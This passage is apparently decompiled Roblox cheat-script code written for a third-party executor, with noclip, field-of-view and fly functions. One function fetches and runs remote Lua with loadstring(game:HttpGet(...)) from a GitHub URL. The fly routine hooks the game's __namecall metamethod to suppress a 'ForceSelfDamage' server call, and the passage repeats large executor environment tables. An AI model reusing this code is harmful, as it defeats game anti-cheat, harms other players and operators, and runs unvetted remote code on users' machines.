        fireproximityprompt = fireproximityprompt,
        keypress = keypress,
        keyrelease = keyrelease,
        mouse1click = mouse1click,
        mouse1press = mouse1press,
        mouse1release = mouse1release,
        mousemoverel = mousemoverel,
        queue_on_teleport = queue_on_teleport,
        saveinstance = saveinstance,
        decompile = decompile,
        getscriptclosure = getscriptclosure,
        getfunctionhash = getfunctionhash,
        getcustomasset = getcustomasset,
        rconsoleprint = rconsoleprint,
        rconsolename = rconsolename,
        rconsoleclear = rconsoleclear,
        setfflag = setfflag,
        protectgui = protectgui,
        unprotectgui = unprotectgui,
        sethiddenproperty = sethiddenproperty,
        gethiddenproperty = gethiddenproperty,
        isnetworkowner = isnetworkowner,
        isfile = isfile,
        isfolder = isfolder,
        makefolder = makefolder,
        delfile = delfile,
        delfolder = delfolder,
        listfiles = listfiles,
        readfile = readfile,
        writefile = writefile,
        appendfile = appendfile,
        loadfile = loadfile,
        dofile = dofile,
        request = request,
        http_request = request,
        crypt = crypt,
        base64_encode = base64_encode,
        base64_decode = base64_decode,
        base64encode = base64_encode,
        base64decode = base64_decode,
        syn = syn,
        WebSocket = WebSocket,
        Drawing = Drawing,
        DrawingImmediate = Drawing,
        }
        Pack._G = Pack
        local Element7 = Pack
        local Noclip = Pack.Noclip
        local Element8, Element9, Unpacked
        if Noclip then
            task.wait(0.1)
            while true do
                Noclip = LocalPlayer2.Character
                if Noclip then
                    Noclip:GetDescendants()
                    Element7 = ipairs(Element8)
                    Pack = table.pack(Element7(Element8, 0))
                    Unpacked = table.unpack(Pack, 1, Pack.n)
                    if not (Unpacked == nil) then
                        Element9 = Unpacked
                        while true do
                            if table.unpack(Pack, 2, Pack.n):IsA("BasePart") then
                                table.unpack(Pack, 2, Pack.n).CanCollide = false
                            end
                            Pack = table.pack(Element7(Element8, Element9))
                            Unpacked = table.unpack(Pack, 1, Pack.n)
                            if Unpacked ~= nil then
                                Element9 = Unpacked
                                continue
                            end
                            break
                        end
                    end
                    Noclip = getgenv(Element8, Unpacked, table.unpack(Pack, 1, Pack.n)).Noclip
                    task.wait(0.1)
                    continue
                end
                if getgenv(select(3, ...)).Noclip then
                    task.wait(0.1)
                    continue
                end
                break
            end
            return LocalPlayer2
        else
            return LocalPlayer2, Noclip, Element7
        end
    end
    x5.Noclip = Context
    local LocalPlayer3, Character5, Element10, Element11, Element12, Unpacked2, Pack2
    if Context then
        task.spawn(Job7)
        return Context
    else
        LocalPlayer3 = game.Players.LocalPlayer
        Character5 = LocalPlayer3.Character
        if Character5 then
            Character5:GetDescendants()
            Element10 = ipairs(Element11)
            Pack2 = table.pack(Element10(Element11, 0))
            Unpacked2 = table.unpack(Pack2, 1, Pack2.n)
            if not (Unpacked2 == nil) then
                Element12 = Unpacked2
                while true do
                    if Pack2[2]:IsA("BasePart") then
                        Pack2[2].CanCollide = true
                    end
                    Pack2 = table.pack(Element10(Element11, Element12))
                    Unpacked2 = table.unpack(Pack2, 1, Pack2.n)
                    if Unpacked2 ~= nil then
                        Element12 = Unpacked2
                        continue
                    end
                    break
                end
            end
            return Context, LocalPlayer3, Character5, Element10, Element11, Unpacked2, table.unpack(Pack2, 1, Pack2.n)
        else
            return
        end
    end
end

local function Job8(Sender)
    local Element13
    local function Job9(...)
        local Element14 = {
        print = print,
        type = type,
        tostring = tostring,
        tonumber = tonumber,
        next = next,
        pairs = pairs,
        ipairs = ipairs,
        select = select,
        rawget = rawget,
        rawset = rawset,
        rawequal = rawequal,
        rawlen = rawlen,
        setmetatable = setmetatable,
        getmetatable = getmetatable,
        assert = assert,
        error = error,
        pcall = pcall,
        xpcall = xpcall,
        unpack = unpack,
        getfenv = getfenv,
        setfenv = setfenv,
        collectgarbage = collectgarbage,
        gcinfo = gcinfo,
        newproxy = newproxy,
        require = require,
        load = load,
        loadstring = load,
        _VERSION = "Lua 5.1",
        string = string,
        table = table,
        math = math,
        bit32 = bit32,
        bit = bit32,
        os = os,
        io = io,
        utf8 = utf8,
        debug = debug,
        coroutine = coroutine,
        buffer = buffer,
        game = game,
        Game = game,
        workspace = workspace,
        Workspace = workspace,
        script = script,
        shared = shared,
        plugin = plugin,
        Instance = Instance,
        Vector2 = Vector2,
        Vector3 = Vector3,
        Vector2int16 = Vector2int16,
        Vector3int16 = Vector3int16,
        CFrame = CFrame,
        Color3 = Color3,
        UDim = UDim,
        UDim2 = UDim2,
        Rect = Rect,
        Region3 = Region3,
        Ray = Ray,
        NumberRange = NumberRange,
        NumberSequence = NumberSequence,
        NumberSequenceKeypoint = NumberSequenceKeypoint,
        ColorSequence = ColorSequence,
        ColorSequenceKeypoint = ColorSequenceKeypoint,
        BrickColor = BrickColor,
        TweenInfo = TweenInfo,
        PhysicalProperties = PhysicalProperties,
        Faces = Faces,
        Axes = Axes,
        Random = Random,
        DateTime = DateTime,
        Font = Font,
        OverlapParams = OverlapParams,
        RaycastParams = RaycastParams,
        Enum = Enum,
        wait = wait,
        tick = tick,
        time = time,
        elapsedTime = elapsedTime,
        typeof = typeof,
        warn = warn,
        spawn = spawn,
        delay = delay,
        task = task,
        getgenv = getgenv,
        getrenv = getrenv,
        getsenv = getsenv,
        getreg = getreg,
        getgc = getgc,
        getloadedmodules = getloadedmodules,
        getinstances = getinstances,
        getnilinstances = getnilinstances,
        getscripts = getscripts,
        getconnections = getconnections,
        getrunningscripts = getrunningscripts,
        getcallingscript = getcallingscript,
        gethui = gethui,
        getthreadidentity = getthreadidentity,
        setthreadidentity = setthreadidentity,
        checkcaller = checkcaller,
        islclosure = islclosure,
        iscclosure = iscclosure,
        isourclosure = isourclosure,
        is_synapse_function = is_synapse_function,
        clonefunction = clonefunction,
        cloneref = cloneref,
        compareinstances = compareinstances,
        newcclosure = newcclosure,
        hookfunction = hookfunction,
        replaceclosure = replaceclosure,
        hookmetamethod = hookmetamethod,
        getrawmetatable = getrawmetatable,
        setrawmetatable = setrawmetatable,
        setreadonly = setreadonly,
        isreadonly = isreadonly,
        make_writeable = make_writeable,
        make_readonly = make_readonly,
        identifyexecutor = identifyexecutor,
        getexecutorname = getexecutorname,
        setclipboard = setclipboard,
        toclipboard = toclipboard,
        setfpscap = setfpscap,
        firetouchinterest = firetouchinterest,
        fireclickdetector = fireclickdetector,
        fireproximityprompt = fireproximityprompt,
        keypress = keypress,
        keyrelease = keyrelease,
        mouse1click = mouse1click,
        mouse1press = mouse1press,
        mouse1release = mouse1release,
        mousemoverel = mousemoverel,
        queue_on_teleport = queue_on_teleport,
        saveinstance = saveinstance,
        decompile = decompile,
        getscriptclosure = getscriptclosure,
        getfunctionhash = getfunctionhash,
        getcustomasset = getcustomasset,
        rconsoleprint = rconsoleprint,
        rconsolename = rconsolename,
        rconsoleclear = rconsoleclear,
        setfflag = setfflag,
        protectgui = protectgui,
        unprotectgui = unprotectgui,
        sethiddenproperty = sethiddenproperty,
        gethiddenproperty = gethiddenproperty,
        isnetworkowner = isnetworkowner,
        isfile = isfile,
        isfolder = isfolder,
        makefolder = makefolder,
        delfile = delfile,
        delfolder = delfolder,
        listfiles = listfiles,
        readfile = readfile,
        writefile = writefile,
        appendfile = appendfile,
        loadfile = loadfile,
        dofile = dofile,
        request = request,
        http_request = request,
        crypt = crypt,
        base64_encode = base64_encode,
        base64_decode = base64_decode,
        base64encode = base64_encode,
        base64decode = base64_decode,
        syn = syn,
        WebSocket = WebSocket,
        Drawing = Drawing,
        DrawingImmediate = Drawing,
        }
        Element14._G = Element14
        local Element15 = Element14
        local FOV = Element14.FOV
        if FOV then
            FOV = getgenv(select(3, ...)).FOV == Element13
            Element15 = task
        else
            return FOV, Element15
        end
        Element15.wait(0.1)
        while true do
            FOV = workspace.CurrentCamera
            if FOV then
                FOV.FieldOfView = Element13
            end
            if getgenv(select(3, ...)).FOV and getgenv(select(4, ...)).FOV == Element13 then
                task.wait(0.1)
                continue
            end
            break
        end
    end
    Element13 = tonumber(Sender)
    local Camera = Element13
    if Element13 then
        Camera = 1 <= Element13
    end
    if Camera then
        Camera = Element13 <= 120
    end
    local Element16
    if Camera then
        Element16 = {
        print = print,
        type = type,
        tostring = tostring,
        tonumber = tonumber,
        next = next,
        pairs = pairs,
        ipairs = ipairs,
        select = select,
        rawget = rawget,
        rawset = rawset,
        rawequal = rawequal,
        rawlen = rawlen,
        setmetatable = setmetatable,
        getmetatable = getmetatable,
        assert = assert,
        error = error,
        pcall = pcall,
        xpcall = xpcall,
        unpack = unpack,
        getfenv = getfenv,
        setfenv = setfenv,
        collectgarbage = collectgarbage,
        gcinfo = gcinfo,
        newproxy = newproxy,
        require = require,
        load = load,
        loadstring = load,
        _VERSION = "Lua 5.1",
        string = string,
        table = table,
        math = math,
        bit32 = bit32,
        bit = bit32,
        os = os,
        io = io,
        utf8 = utf8,
        debug = debug,
        coroutine = coroutine,
        buffer = buffer,
        game = game,
        Game = game,
        workspace = workspace,
        Workspace = workspace,
        script = script,
        shared = shared,
        plugin = plugin,
        Instance = Instance,
        Vector2 = Vector2,
        Vector3 = Vector3,
        Vector2int16 = Vector2int16,
        Vector3int16 = Vector3int16,
        CFrame = CFrame,
        Color3 = Color3,
        UDim = UDim,
        UDim2 = UDim2,
        Rect = Rect,
        Region3 = Region3,
        Ray = Ray,
        NumberRange = NumberRange,
        NumberSequence = NumberSequence,
        NumberSequenceKeypoint = NumberSequenceKeypoint,
        ColorSequence = ColorSequence,
        ColorSequenceKeypoint = ColorSequenceKeypoint,
        BrickColor = BrickColor,
        TweenInfo = TweenInfo,
        PhysicalProperties = PhysicalProperties,
        Faces = Faces,
        Axes = Axes,
        Random = Random,
        DateTime = DateTime,
        Font = Font,
        OverlapParams = OverlapParams,
        RaycastParams = RaycastParams,
        Enum = Enum,
        wait = wait,
        tick = tick,
        time = time,
        elapsedTime = elapsedTime,
        typeof = typeof,
        warn = warn,
        spawn = spawn,
        delay = delay,
        task = task,
        getgenv = getgenv,
        getrenv = getrenv,
        getsenv = getsenv,
        getreg = getreg,
        getgc = getgc,
        getloadedmodules = getloadedmodules,
        getinstances = getinstances,
        getnilinstances = getnilinstances,
        getscripts = getscripts,
        getconnections = getconnections,
        getrunningscripts = getrunningscripts,
        getcallingscript = getcallingscript,
        gethui = gethui,
        getthreadidentity = getthreadidentity,
        setthreadidentity = setthreadidentity,
        checkcaller = checkcaller,
        islclosure = islclosure,
        iscclosure = iscclosure,
        isourclosure = isourclosure,
        is_synapse_function = is_synapse_function,
        clonefunction = clonefunction,
        cloneref = cloneref,
        compareinstances = compareinstances,
        newcclosure = newcclosure,
        hookfunction = hookfunction,
        replaceclosure = replaceclosure,
        hookmetamethod = hookmetamethod,
        getrawmetatable = getrawmetatable,
        setrawmetatable = setrawmetatable,
        setreadonly = setreadonly,
        isreadonly = isreadonly,
        make_writeable = make_writeable,
        make_readonly = make_readonly,
        identifyexecutor = identifyexecutor,
        getexecutorname = getexecutorname,
        setclipboard = setclipboard,
        toclipboard = toclipboard,
        setfpscap = setfpscap,
        firetouchinterest = firetouchinterest,
        fireclickdetector = fireclickdetector,
        fireproximityprompt = fireproximityprompt,
        keypress = keypress,
        keyrelease = keyrelease,
        mouse1click = mouse1click,
        mouse1press = mouse1press,
        mouse1release = mouse1release,
        mousemoverel = mousemoverel,
        queue_on_teleport = queue_on_teleport,
        saveinstance = saveinstance,
        decompile = decompile,
        getscriptclosure = getscriptclosure,
        getfunctionhash = getfunctionhash,
        getcustomasset = getcustomasset,
        rconsoleprint = rconsoleprint,
        rconsolename = rconsolename,
        rconsoleclear = rconsoleclear,
        setfflag = setfflag,
        protectgui = protectgui,
        unprotectgui = unprotectgui,
        sethiddenproperty = sethiddenproperty,
        gethiddenproperty = gethiddenproperty,
        isnetworkowner = isnetworkowner,
        isfile = isfile,
        isfolder = isfolder,
        makefolder = makefolder,
        delfile = delfile,
        delfolder = delfolder,
        listfiles = listfiles,
        readfile = readfile,
        writefile = writefile,
        appendfile = appendfile,
        loadfile = loadfile,
        dofile = dofile,
        request = request,
        http_request = request,
        crypt = crypt,
        base64_encode = base64_encode,
        base64_decode = base64_decode,
        base64encode = base64_encode,
        base64decode = base64_decode,
        syn = syn,
        WebSocket = WebSocket,
        Drawing = Drawing,
        DrawingImmediate = Drawing,
        }
        Element16._G = Element16
        Element16.FOV = Element13
        Camera = workspace.CurrentCamera
        Camera.FieldOfView = Element13
        task.spawn(Job9)
        return Sender, Element13, Camera
    else
        return
    end
end

local function Job10()
    local Element17 = {
    print = print,
    type = type,
    tostring = tostring,
    tonumber = tonumber,
    next = next,
    pairs = pairs,
    ipairs = ipairs,
    select = select,
    rawget = rawget,
    rawset = rawset,
    rawequal = rawequal,
    rawlen = rawlen,
    setmetatable = setmetatable,
    getmetatable = getmetatable,
    assert = assert,
    error = error,
    pcall = pcall,
    xpcall = xpcall,
    unpack = unpack,
    getfenv = getfenv,
    setfenv = setfenv,
    collectgarbage = collectgarbage,
    gcinfo = gcinfo,
    newproxy = newproxy,
    require = require,
    load = load,
    loadstring = load,
    _VERSION = "Lua 5.1",
    string = string,
    table = table,
    math = math,
    bit32 = bit32,
    bit = bit32,
    os = os,
    io = io,
    utf8 = utf8,
    debug = debug,
    coroutine = coroutine,
    buffer = buffer,
    game = game,
    Game = game,
    workspace = workspace,
    Workspace = workspace,
    script = script,
    shared = shared,
    plugin = plugin,
    Instance = Instance,
    Vector2 = Vector2,
    Vector3 = Vector3,
    Vector2int16 = Vector2int16,
    Vector3int16 = Vector3int16,
    CFrame = CFrame,
    Color3 = Color3,
    UDim = UDim,
    UDim2 = UDim2,
    Rect = Rect,
    Region3 = Region3,
    Ray = Ray,
    NumberRange = NumberRange,
    NumberSequence = NumberSequence,
    NumberSequenceKeypoint = NumberSequenceKeypoint,
    ColorSequence = ColorSequence,
    ColorSequenceKeypoint = ColorSequenceKeypoint,
    BrickColor = BrickColor,
    TweenInfo = TweenInfo,
    PhysicalProperties = PhysicalProperties,
    Faces = Faces,
    Axes = Axes,
    Random = Random,
    DateTime = DateTime,
    Font = Font,
    OverlapParams = OverlapParams,
    RaycastParams = RaycastParams,
    Enum = Enum,
    wait = wait,
    tick = tick,
    time = time,
    elapsedTime = elapsedTime,
    typeof = typeof,
    warn = warn,
    spawn = spawn,
    delay = delay,
    task = task,
    getgenv = getgenv,
    getrenv = getrenv,
    getsenv = getsenv,
    getreg = getreg,
    getgc = getgc,
    getloadedmodules = getloadedmodules,
    getinstances = getinstances,
    getnilinstances = getnilinstances,
    getscripts = getscripts,
    getconnections = getconnections,
    getrunningscripts = getrunningscripts,
    getcallingscript = getcallingscript,
    gethui = gethui,
    getthreadidentity = getthreadidentity,
    setthreadidentity = setthreadidentity,
    checkcaller = checkcaller,
    islclosure = islclosure,
    iscclosure = iscclosure,
    isourclosure = isourclosure,
    is_synapse_function = is_synapse_function,
    clonefunction = clonefunction,
    cloneref = cloneref,
    compareinstances = compareinstances,
    newcclosure = newcclosure,
    hookfunction = hookfunction,
    replaceclosure = replaceclosure,
    hookmetamethod = hookmetamethod,
    getrawmetatable = getrawmetatable,
    setrawmetatable = setrawmetatable,
    setreadonly = setreadonly,
    isreadonly = isreadonly,
    make_writeable = make_writeable,
    make_readonly = make_readonly,
    identifyexecutor = identifyexecutor,
    getexecutorname = getexecutorname,
    setclipboard = setclipboard,
    toclipboard = toclipboard,
    setfpscap = setfpscap,
    firetouchinterest = firetouchinterest,
    fireclickdetector = fireclickdetector,
    fireproximityprompt = fireproximityprompt,
    keypress = keypress,
    keyrelease = keyrelease,
    mouse1click = mouse1click,
    mouse1press = mouse1press,
    mouse1release = mouse1release,
    mousemoverel = mousemoverel,
    queue_on_teleport = queue_on_teleport,
    saveinstance = saveinstance,
    decompile = decompile,
    getscriptclosure = getscriptclosure,
    getfunctionhash = getfunctionhash,
    getcustomasset = getcustomasset,
    rconsoleprint = rconsoleprint,
    rconsolename = rconsolename,
    rconsoleclear = rconsoleclear,
    setfflag = setfflag,
    protectgui = protectgui,
    unprotectgui = unprotectgui,
    sethiddenproperty = sethiddenproperty,
    gethiddenproperty = gethiddenproperty,
    isnetworkowner = isnetworkowner,
    isfile = isfile,
    isfolder = isfolder,
    makefolder = makefolder,
    delfile = delfile,
    delfolder = delfolder,
    listfiles = listfiles,
    readfile = readfile,
    writefile = writefile,
    appendfile = appendfile,
    loadfile = loadfile,
    dofile = dofile,
    request = request,
    http_request = request,
    crypt = crypt,
    base64_encode = base64_encode,
    base64_decode = base64_decode,
    base64encode = base64_encode,
    base64decode = base64_decode,
    syn = syn,
    WebSocket = WebSocket,
    Drawing = Drawing,
    DrawingImmediate = Drawing,
    }
    Element17._G = Element17
    Element17.FOV = 70
    local Camera2 = workspace.CurrentCamera
    if Camera2 then
        Camera2.FieldOfView = 70
    end
end

local function Job11()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/pl11451481mvcxz/FlyUI/refs/heads/main/FlyV3"))
end

local function Job12(flySpeed)
    x6.FlySpeed = flySpeed
    return flySpeed, x6
end

local function Job13(Receiver, ...)
    local Humanoid6
    local function Remote(Remote2, ...)
        if not (getnamecallmethod() == "FireServer" and tostring(Remote2) == "ForceSelfDamage") then
            return Humanoid6(Remote2, ...)
        end
        return nil
    end
    local RunService, Runservice, Character6, Humanoid7, Element18, PlayerScripts, Bodyvelocity, Playermodule
    local function Job14()
        local Element19 = x7
        local FlyEnabled = x7.FlyEnabled
        local Element20
        if FlyEnabled then
            Element20 = {
            print = print,
            type = type,
            tostring = tostring,
            tonumber = tonumber,
            next = next,
            pairs = pairs,
            ipairs = ipairs,
            select = select,
            rawget = rawget,
            rawset = rawset,
            rawequal = rawequal,
            rawlen = rawlen,
            setmetatable = setmetatable,
            getmetatable = getmetatable,
            assert = assert,
            error = error,
            pcall = pcall,
            xpcall = xpcall,
            unpack = unpack,
            getfenv = getfenv,
            setfenv = setfenv,
            collectgarbage = collectgarbage,
            gcinfo = gcinfo,
            newproxy = newproxy,
            require = require,
            load = load,
            loadstring = load,
            _VERSION = "Lua 5.1",
            string = string,
            table = table,
            math = math,
            bit32 = bit32,
            bit = bit32,
            os = os,
            io = io,
            utf8 = utf8,
            debug = debug,
            coroutine = coroutine,
            buffer = buffer,
            game = game,
            Game = game,
            workspace = workspace,
            Workspace = workspace,
            script = script,
            shared = shared,
            plugin = plugin,
            Instance = Instance,
            Vector2 = Vector2,
            Vector3 = Vector3,
            Vector2int16 = Vector2int16,
            Vector3int16 = Vector3int16,
            CFrame = CFrame,
            Color3 = Color3,
            UDim = UDim,
            UDim2 = UDim2,
            Rect = Rect,
            Region3 = Region3,
            Ray = Ray,
            NumberRange = NumberRange,
            NumberSequence = NumberSequence,
            NumberSequenceKeypoint = NumberSequenceKeypoint,
            ColorSequence = ColorSequence,
            ColorSequenceKeypoint = ColorSequenceKeypoint,
            BrickColor = BrickColor,
            TweenInfo = TweenInfo,
            PhysicalProperties = PhysicalProperties,
            Faces = Faces,
            Axes = Axes,
            Random = Random,
            DateTime = DateTime,
            Font = Font,
            OverlapParams = OverlapParams,
            RaycastParams = RaycastParams,
            Enum = Enum,
            wait = wait,
            tick = tick,
            time = time,
            elapsedTime = elapsedTime,
            typeof = typeof,
            warn = warn,
            spawn = spawn,
            delay = delay,
            task = task,
            getgenv = getgenv,
            getrenv = getrenv,
            getsenv = getsenv,
            getreg = getreg,
            getgc = getgc,
            getloadedmodules = getloadedmodules,
            getinstances = getinstances,
            getnilinstances = getnilinstances,
            getscripts = getscripts,
            getconnections = getconnections,
            getrunningscripts = getrunningscripts,
            getcallingscript = getcallingscript,
            gethui = gethui,
            getthreadidentity = getthreadidentity,
            setthreadidentity = setthreadidentity,
            checkcaller = checkcaller,
            islclosure = islclosure,
            iscclosure = iscclosure,
            isourclosure = isourclosure,
            is_synapse_function = is_synapse_function,
            clonefunction = clonefunction,
            cloneref = cloneref,
            compareinstances = compareinstances,
            newcclosure = newcclosure,
            hookfunction = hookfunction,
            replaceclosure = replaceclosure,
            hookmetamethod = hookmetamethod,
            getrawmetatable = getrawmetatable,
            setrawmetatable = setrawmetatable,
            setreadonly = setreadonly,
            isreadonly = isreadonly,
            make_writeable = make_writeable,
            make_readonly = make_readonly,
            identifyexecutor = identifyexecutor,
            getexecutorname = getexecutorname,
            setclipboard = setclipboard,
            toclipboard = toclipboard,
            setfpscap = setfpscap,
            firetouchinterest = firetouchinterest,
            fireclickdetector = fireclickdetector,
            fireproximityprompt = fireproximityprompt,
            keypress = keypress,
            keyrelease = keyrelease,
            mouse1click = mouse1click,
            mouse1press = mouse1press,
            mouse1release = mouse1release,
            mousemoverel = mousemoverel,
            queue_on_teleport = queue_on_teleport,
            saveinstance = saveinstance,
            decompile = decompile,
            getscriptclosure = getscriptclosure,
            getfunctionhash = getfunctionhash,
            getcustomasset = getcustomasset,
            rconsoleprint = rconsoleprint,
            rconsolename = rconsolename,
            rconsoleclear = rconsoleclear,
            setfflag = setfflag,
            protectgui = protectgui,
            unprotectgui = unprotectgui,
            sethiddenproperty = sethiddenproperty,
            gethiddenproperty = gethiddenproperty,
            isnetworkowner = isnetworkowner,
            isfile = isfile,
            isfolder = isfolder,
            makefolder = makefolder,
            delfile = delfile,
            delfolder = delfolder,
            listfiles = listfiles,
            readfile = readfile,
            writefile = writefile,
            appendfile = appendfile,
            loadfile = loadfile,
            dofile = dofile,
            request = request,
            http_request = request,
            crypt = crypt,
            base64_encode = base64_encode,
            base64_decode = base64_decode,
            base64encode = base64_encode,
            base64decode = base64_decode,
            syn = syn,
            WebSocket = WebSocket,
            Drawing = Drawing,
            DrawingImmediate = Drawing,
            }
            Element20._G = Element20
            Element19 = Element20
            FlyEnabled = Element20.FlyLoop
        end
        local Element21, Element22, Element23, Element24, Element25, Element26
        if FlyEnabled then
            Element20 = {
            print = print,
            type = type,
            tostring = tostring,
            tonumber = tonumber,
            next = next,
            pairs = pairs,
            ipairs = ipairs,
            select = select,
            rawget = rawget,
            rawset = rawset,
            rawequal = rawequal,
            rawlen = rawlen,
            setmetatable = setmetatable,
            getmetatable = getmetatable,
            assert = assert,
            error = error,
            pcall = pcall,
            xpcall = xpcall,
            unpack = unpack,
            getfenv = getfenv,
            setfenv = setfenv,
            collectgarbage = collectgarbage,
            gcinfo = gcinfo,
            newproxy = newproxy,
            require = require,
            load = load,
            loadstring = load,
            _VERSION = "Lua 5.1",
            string = string,
            table = table,
            math = math,
            bit32 = bit32,
            bit = bit32,
            os = os,
            io = io,
            utf8 = utf8,
            debug = debug,
            coroutine = coroutine,
            buffer = buffer,
            game = game,
            Game = game,
            workspace = workspace,
            Workspace = workspace,
            script = script,
            shared = shared,
            plugin = plugin,
            Instance = Instance,
            Vector2 = Vector2,
            Vector3 = Vector3,
            Vector2int16 = Vector2int16,
            Vector3int16 = Vector3int16,
            CFrame = CFrame,
            Color3 = Color3,
            UDim = UDim,
            UDim2 = UDim2,
            Rect = Rect,
            Region3 = Region3,
            Ray = Ray,
            NumberRange = NumberRange,
            NumberSequence = NumberSequence,
            NumberSequenceKeypoint = NumberSequenceKeypoint,
            ColorSequence = ColorSequence,
            ColorSequenceKeypoint = ColorSequenceKeypoint,
            BrickColor = BrickColor,
            TweenInfo = TweenInfo,
            PhysicalProperties = PhysicalProperties,
            Faces = Faces,
            Axes = Axes,
            Random = Random,
            DateTime = DateTime,
            Font = Font,
            OverlapParams = OverlapParams,
            RaycastParams = RaycastParams,
            Enum = Enum,
            wait = wait,
            tick = tick,
            time = time,
            elapsedTime = elapsedTime,
            typeof = typeof,
            warn = warn,
            spawn = spawn,
            delay = delay,
            task = task,
            getgenv = getgenv,
            getrenv = getrenv,
            getsenv = getsenv,
            getreg = getreg,
            getgc = getgc,
            getloadedmodules = getloadedmodules,
            getinstances = getinstances,
            getnilinstances = getnilinstances,
            getscripts = getscripts,
            getconnections = getconnections,
            getrunningscripts = getrunningscripts,
            getcallingscript = getcallingscript,
            gethui = gethui,
            getthreadidentity = getthreadidentity,
            setthreadidentity = setthreadidentity,
            checkcaller = checkcaller,
            islclosure = islclosure,
            iscclosure = iscclosure,
            isourclosure = isourclosure,
            is_synapse_function = is_synapse_function,
            clonefunction = clonefunction,
            cloneref = cloneref,
            compareinstances = compareinstances,
            newcclosure = newcclosure,
            hookfunction = hookfunction,
            replaceclosure = replaceclosure,
            hookmetamethod = hookmetamethod,
            getrawmetatable = getrawmetatable,
            setrawmetatable = setrawmetatable,
            setreadonly = setreadonly,
            isreadonly = isreadonly,
            make_writeable = make_writeable,
            make_readonly = make_readonly,
            identifyexecutor = identifyexecutor,
            getexecutorname = getexecutorname,
            setclipboard = setclipboard,
            toclipboard = toclipboard,
            setfpscap = setfpscap,
            firetouchinterest = firetouchinterest,
            fireclickdetector = fireclickdetector,
            fireproximityprompt = fireproximityprompt,
            keypress = keypress,
            keyrelease = keyrelease,
            mouse1click = mouse1click,
            mouse1press = mouse1press,
            mouse1release = mouse1release,
            mousemoverel = mousemoverel,
            queue_on_teleport = queue_on_teleport,
            saveinstance = saveinstance,
            decompile = decompile,
            getscriptclosure = getscriptclosure,
            getfunctionhash = getfunctionhash,
            getcustomasset = getcustomasset,
            rconsoleprint = rconsoleprint,
            rconsolename = rconsolename,
            rconsoleclear = rconsoleclear,
            setfflag = setfflag,
            protectgui = protectgui,
            unprotectgui = unprotectgui,
            sethiddenproperty = sethiddenproperty,
            gethiddenproperty = gethiddenproperty,
            isnetworkowner = isnetworkowner,
            isfile = isfile,
            isfolder = isfolder,
            makefolder = makefolder,
            delfile = delfile,
            delfolder = delfolder,
            listfiles = listfiles,
            readfile = readfile,
            writefile = writefile,
            appendfile = appendfile,
            loadfile = loadfile,
            dofile = dofile,
            request = request,
            http_request = request,
            crypt = crypt,
            base64_encode = base64_encode,
            base64_decode = base64_decode,
            base64encode = base64_encode,
            base64decode = base64_decode,
            syn = syn,
            WebSocket = WebSocket,
            Drawing = Drawing,
            DrawingImmediate = Drawing,
            }
            Element20._G = Element20
            FlyEnabled = Element20.FlySpeed
            Element19 = Element18:GetMoveVector()
            Element23 =-Element19.Z
            Element24 = Element19.X
            Element21 = Runservice.CFrame.LookVector * Element23 + Runservice.CFrame.RightVector * Element24
            PlayerScripts.Velocity = 0 < Element19.Magnitude and Element21.Unit * FlyEnabled or Vector3.new(0, 0.1, 0)
            Element22 = CFrame.new
            Element23 = Vector3.zero
            Element24 = 0 < Element19.Magnitude and Element21
            if not Element24 then
                Element25 = Runservice.CFrame.LookVector.X
                Element26 = Runservice.CFrame.LookVector.Z
                Element24 = Vector3.new(Element25, 0, Element26)
            end
            Bodyvelocity.CFrame = Element22(Element23, Element24)
            Humanoid7:ChangeState(14)
            Element22 = RunService
            while true do
                Element22.RenderStepped:Wait()
                if getgenv(Element21).FlyEnabled and getgenv(Element21).FlyLoop and Character6.Parent then
                    FlyEnabled = getgenv(Element21).FlySpeed
                    Element19 = Element18:GetMoveVector()
                    Element23 =-Element19.Z
                    Element24 = Element19.X
                    Element21 = Runservice.CFrame.LookVector * Element23 + Runservice.CFrame.RightVector * Element24
                    PlayerScripts.Velocity = 0 < Element19.Magnitude and Element21.Unit * FlyEnabled or Vector3.new(0, 0.1, 0)
                    Element22 = CFrame.new
                    Element23 = Vector3.zero
                    Element24 = 0 < Element19.Magnitude and Element21
                    if not Element24 then
                        Element25 = Runservice.CFrame.LookVector.X
                        Element26 = Runservice.CFrame.LookVector.Z
                        Element24 = Vector3.new(Element25, 0, Element26)
                    end
                    Bodyvelocity.CFrame = Element22(Element23, Element24)
                    Humanoid7:ChangeState(14)
                    Element22 = RunService
                    continue
                end
                break
            end
            Playermodule.Parent = Character6
            PlayerScripts:Destroy()
            Bodyvelocity:Destroy()
            return
        else
            return Bodyvelocity, Element19
        end
    end
    x6.FlyEnabled = Receiver
    local Players, LocalPlayer4, HumanoidRootPart, MT
    if Receiver then
        RunService = game
        Players = game:GetService("Players")
        Runservice = "RunService"
        RunService = game:GetService("RunService")
        LocalPlayer4 = Players.LocalPlayer
        Runservice = workspace.CurrentCamera
        Character6 = LocalPlayer4.Character
        if not Character6 then
            Character6 = LocalPlayer4.CharacterAdded
            Character6 = Character6:Wait()
        end
        Humanoid7 = Character6
        HumanoidRootPart = Character6:WaitForChild("HumanoidRootPart")
        Humanoid6 = "Humanoid"
        Humanoid7 = Character6:WaitForChild("Humanoid")
        Humanoid6 = game
        MT = getrawmetatable(game)
        Humanoid6 = setreadonly
        Element18 = MT
        PlayerScripts = false
        setreadonly(MT, false)
        Humanoid6 = MT.__namecall
        PlayerScripts = Remote
        MT.__namecall = newcclosure(Remote)
        Element18 = require
        PlayerScripts = LocalPlayer4.PlayerScripts
        Playermodule = "PlayerModule"
        Bodyvelocity = PlayerScripts
        PlayerScripts = PlayerScripts.WaitForChild(Bodyvelocity, "PlayerModule")
        Element18 = Element18(PlayerScripts)
        PlayerScripts = Element18
        Element18 = Element18.GetControls(PlayerScripts)
        Bodyvelocity = "BodyVelocity"
        PlayerScripts = Instance.new("BodyVelocity")
        Playermodule = 1000000
        Bodyvelocity = Vector3.new(1000000, 1000000, 1000000)
        PlayerScripts.MaxForce = Bodyvelocity
        PlayerScripts.Parent = HumanoidRootPart
        Playermodule = "BodyGyro"
        Bodyvelocity = Instance.new("BodyGyro")
        Bodyvelocity.MaxTorque = Vector3.new(1000000, 1000000, 1000000)
        Bodyvelocity.P = 8000
        Bodyvelocity.Parent = HumanoidRootPart
        Playermodule = Character6:FindFirstChild("Animate")
        if Playermodule then
            Playermodule.Parent = nil
        end
        getgenv(select(7, ...)).FlyLoop = true
        task.spawn(Job14)
        return Receiver, Players, RunService, LocalPlayer4, Runservice, Character6, HumanoidRootPart, Humanoid7, MT, Humanoid6, Element18, PlayerScripts, Bodyvelocity, Playermodule
    else
        RunService = false
        getgenv().FlyLoop = false
        return
    end
end

local function getPlayers3()
